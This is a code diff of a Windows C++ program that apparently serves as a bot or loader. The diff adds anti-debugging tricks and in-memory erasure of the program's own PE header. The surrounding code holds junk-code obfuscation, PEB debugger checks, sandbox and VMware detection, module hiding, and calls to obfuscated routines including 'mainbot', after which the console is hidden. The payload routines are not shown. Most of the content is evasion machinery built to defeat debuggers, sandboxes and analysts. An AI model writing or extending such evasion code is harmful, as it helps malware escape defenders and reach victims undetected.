@@ -15,6 +15,32 @@
 #pragma comment(lib, "urlmon.lib")
 #pragma comment(lib,"Wininet.lib") 
 
+inline void PushPopSS()
+{
+
+__asm
+{
+    push ss
+    pop ss
+    mov eax, 9 // This line executes but is stepped over
+    xor edx, edx // This is where the debugger will step to
+}
+}
+inline void ErasePEHeaderFromMemory()
+{
+    DWORD OldProtect = 0;
+
+    // Get base address of module
+    char* pBaseAddr = (char*)GetModuleHandle(NULL);
+
+    // Change memory protection
+    VirtualProtect(pBaseAddr, 4096, // Assume x86 page size
+        PAGE_READWRITE, &OldProtect);
+
+    // Erase the header
+    ZeroMemory(pBaseAddr, 4096);
+}
+
 #define JUNK_CODE_ONE        \
     __asm{push eax}            \
     __asm{xor eax, eax}        \
@@ -355,7 +381,7 @@ BOOL IsVMware()
     __except (EXCEPTION_EXECUTE_HANDLER)
     {
         return FALSE;
-        
+
     }
 
     return bDetected;
@@ -386,14 +412,20 @@ int main()
         JUNK_CODE_ONE
         JUNK_CODE_ONE
         JUNK_CODE_ONE
+    
+    PushPopSS();
+    ErasePEHeaderFromMemory();
+    if (IsDebuggerPresent())
+            exit(0);
     if (AD_PEB_NtGlobalFlags())
-        exit(0);
+            exit(0);
     if (AD_CheckRemoteDebuggerPresent())
         exit(0);
     if (AD_PEB_IsDebugged())
         exit(0);
     if (Int2DCheck())
         exit(0);
+
     JUNK_CODE_ONE
         JUNK_CODE_ONE
         JUNK_CODE_ONE
@@ -403,12 +435,12 @@ int main()
         JUNK_CODE_ONE
         JUNK_CODE_ONE
         JUNK_CODE_ONE
-    HideModule;
+        HideModule;
     AntiHeaders;
     AntiRevers;
     SetConsoleTitleA(RandomTitle(rand() % 90 + 20).c_str());
 
-    
+
     if (GetLastError == 0)
     {
         JUNK_CODE_ONE
@@ -421,7 +453,7 @@ int main()
             JUNK_CODE_ONE
             JUNK_CODE_ONE
 
-        IsSandboxie();
+            IsSandboxie();
         IsVMware();
 
         bool checkconnection = InternetCheckConnection("https://google.com", FLAG_ICC_FORCE_CONNECTION, 0);
@@ -459,52 +491,52 @@ int main()
             LI_FN(VirtualProtect).in(LI_MODULE("ntdll.dll").cached());
             LI_FN(VirtualProtect).in(LI_MODULE("user32.dll").cached());
         }
-        
-            OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-            loadserial();
-            OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+
+        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+        loadserial();
+        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+        JUNK_CODE_ONE
             JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-            rydekem();
-            lnttirs();
-            tlmisir();
-            mainbot();
-            rydekem();
-            lnttirs();
-            tlmisir();
             JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            rydekem();
+        lnttirs();
+        tlmisir();
+        mainbot();
+        rydekem();
+        lnttirs();
+        tlmisir();
+        JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
+            JUNK_CODE_ONE
             OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-            FreeConsole();
-            OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
-                TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        
-        
+        FreeConsole();
+        OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+            TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+
+
 
     }
     if (GetLastError != 0)
@@ -528,8 +560,7 @@ int main()
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-        
+
     }
-   
+
 }
-           
